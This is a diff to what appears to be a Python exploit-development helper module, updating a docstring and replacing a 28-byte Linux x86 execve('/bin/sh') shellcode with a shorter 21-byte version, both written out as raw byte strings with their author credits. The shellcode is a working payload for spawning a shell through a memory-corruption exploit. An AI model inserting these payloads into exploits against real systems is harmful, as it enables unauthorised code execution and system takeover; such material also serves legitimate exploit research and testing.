@@ -10,7 +10,7 @@ def bytecode(nasm_src):
 
     return compiled opcodes from your nasm-src file
 
-    examlpe of nasm-src file in excve.asm
+    examlpe of nasm-src file in excve.asm or sh.asm
     """
     opcodes = bc(nasm_src, hdd=False, rembin=True, shctest=False)
     return opcodes
@@ -90,11 +90,10 @@ class linux(object):
         /*
          * Super-small excve
          *
-         * Title:    Linux x86 execve("/bin/sh") - 28 bytes
-         * Author:   Jean Pascal Pereira <pereira@secbiz.de>
-         * Web:	     http://0xffe4.org
+         * Title:    Linux x86 execve("/bin/sh",0,0) - 21 bytes
+         * Author:   honeyjonny <honeyjonny@gmail.com>
          *
          */
         """
-        bin_sh_shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+        bin_sh_shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
         return bin_sh_shellcode
